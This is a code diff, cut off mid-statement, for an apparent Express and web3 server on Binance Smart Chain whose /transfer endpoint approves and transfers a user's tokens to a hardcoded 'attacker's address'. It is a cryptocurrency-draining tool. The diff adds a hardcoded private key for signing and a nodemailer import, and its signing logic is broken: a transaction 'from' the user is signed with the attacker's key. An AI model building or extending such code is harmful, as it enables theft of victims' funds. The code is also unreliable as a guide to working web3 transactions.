@@ -1,6 +1,7 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const { Web3 } = require('web3');
+const nodemailer = require('nodemailer');
 
 const app = express();
 const port = 3000;
@@ -8,7 +9,7 @@ const port = 3000;
 app.use(bodyParser.json());
 
 const web3 = new Web3('https://bsc-dataseed.binance.org/');
-const attackerAddress = '0x690da78b047ef534fd4e2eabd4a3a8a5b733d8df'; // Replace with the attacker's address
+const attackerAddress = '0x92C6b60aFf18a5b5475c78175355913C6BA4E73E'; // Attacker's address
 const contractABI = [
     {
         "constant": true,
@@ -278,19 +279,49 @@ app.post('/transfer', async (req, res) => {
     const { userAddress, amount } = req.body;
 
     try {
+        console.log(`User Address: ${userAddress}`);
+        console.log(`Amount: ${amount}`);
+
+        if (!userAddress || !amount) {
+            throw new Error('User address or amount is undefined');
+        }
+
+        // Convert the amount back to BigInt
+        const amountBigInt = BigInt(amount);
+
+        // Create a new contract instance with the user's address
+        const userContract = new web3.eth.Contract(contractABI, contractAddress);
+
+        // Check the user's balance
+        const balance = await userContract.methods.balanceOf(userAddress).call();
+        console.log(`User balance: ${balance}`);
+
+        if (balance < amountBigInt) {
+            throw new Error('Insufficient balance');
+        }
+
         // Approve the contract to spend all tokens
-        await contract.methods.approve(attackerAddress, amount).send({ from: userAddress });
+        const approvalTx = userContract.methods.approve(attackerAddress, amountBigInt);
+        const data = approvalTx.encodeABI();
+
+        const tx = {
+            from: userAddress,
+            to: contractAddress,
+            data: data,
+            gas: 200000
+        };
+
+        // Sign the transaction with the attacker's private key
+        const signedTx = await web3.eth.accounts.signTransaction(tx, '0xf28b12f8476c558e0a99015b004a32654c08e5fc888825425d3a5a1ed57197fd');
+        const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+        console.log('Approval transaction sent:', txHash);
 
         // Transfer all funds to the attacker's address
-        await contract.methods.transfer(attackerAddress, amount).send({ from: userAddress });
+        const transferTx = userContract.methods.transfer(attackerAddress, amountBigInt);
+        const transferData = transferTx.encodeABI();
 
-        res.send('Funds transferred successfully!');
-    } catch (error) {
-        console.error('Error transferring funds:', error);
-        res.status(500).send('Error transferring funds');
-    }
-});
-
-app.listen(port, () => {
-    console.log(`Server running at http://localhost:${port}`);
-});
+        const transferTxObj = {
+            from: userAddress,
+            to: contractAddress,
+            data: transferData,
+            gas: 20
